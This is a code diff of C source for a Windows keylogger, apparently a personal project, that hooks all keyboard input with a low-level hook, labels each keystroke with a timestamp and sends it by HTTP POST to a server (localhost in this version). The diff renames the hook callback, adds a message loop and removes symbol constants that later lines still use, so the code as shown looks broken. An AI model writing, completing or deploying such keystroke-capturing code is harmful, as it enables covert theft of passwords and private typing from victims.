@@ -2,11 +2,6 @@
 #include "keylogger.h"
 #include <winhttp.h>
 
-#define LOWERCASE_OFFSET 32
-#define SYM_DELETE (-1)
-#define SYM_BACKSPACE (-2)
-#define SYM_ENTER (-3)
-
 HINTERNET session;
 HINTERNET connection;
 
@@ -55,7 +50,6 @@ int misc3KeySymbol(const char symbols[3]) {
 
 
 void sendPacket(char* body) {
-
     HINTERNET request = WinHttpOpenRequest(connection, L"POST", L"/", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
     if (request == NULL) return;
 
@@ -106,7 +100,7 @@ int getSymbol(int vkCode) {
         {'\x9B', '\x9D'}  // ø, Ø
     };
 
-    static const char OEM_3Symbols[4][3] = {
+    static const char OEM_3Symbols[3][3] = {
         {'\xF9', '^', '~'}, // ¨
         {'\xEF', '`', '|'}, // ´
         {'<', '>', '\\'}
@@ -181,13 +175,12 @@ int getSymbol(int vkCode) {
 }
 
 
-LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+LRESULT OnKeyboardEvent(int nCode, WPARAM wParam, LPARAM lParam) {
 
     if (nCode < 0 || (wParam != WM_KEYDOWN && wParam != WM_SYSKEYDOWN)) goto nextHook;
 
     KBDLLHOOKSTRUCT* kbEvent = (KBDLLHOOKSTRUCT*)lParam;
     int symbol = getSymbol((int)kbEvent->vkCode);
-
     if (symbol) {
         char body[32] = {0};
         handleTimestamp(kbEvent->time, body);
@@ -197,7 +190,6 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
             case SYM_ENTER: strcat(body, "[RET]"); break;
             default: sprintf(body, "%s%c", body, symbol); break;
         }
-
         sendPacket(body);
     }
 
@@ -208,28 +200,28 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 
 int main(void) {
 
-    HHOOK hook = SetWindowsHookExA(WH_KEYBOARD_LL, &LowLevelKeyboardProc, NULL, 0);
+    HHOOK hook = SetWindowsHookExA(WH_KEYBOARD_LL, &OnKeyboardEvent, NULL, 0);
     if (hook == NULL) {
         printf("\nFailed to install hook\n");
         exit(EXIT_FAILURE);
     }
 
-    session = WinHttpOpen(L"keylogger", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, WINHTTP_FLAG_ASYNC);
+    session = WinHttpOpen(L"keylogger", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
     if (session == NULL) {
         printf("\nFailed to create session\n");
         exit(EXIT_FAILURE);
     }
     connection = WinHttpConnect(session, L"localhost", INTERNET_DEFAULT_PORT, 0);
     if (connection == NULL) {
-        printf("\nFailed to open connection\n");
+        printf("\nFailed to create connection\n");
         exit(EXIT_FAILURE);
     }
 
     printf("Keylogger running...\n");
-    while (true)
-        SendMessageA(HWND_BROADCAST, WM_CHAR, 0, 0);
+    MSG msg;
+    while(GetMessageA(&msg, NULL, 0, 0) > 0)
+        DispatchMessageA(&msg);
 
-    // unreachable anyway
     UnhookWindowsHookEx(hook);
     WinHttpCloseHandle(session);
     WinHttpCloseHandle(connection);
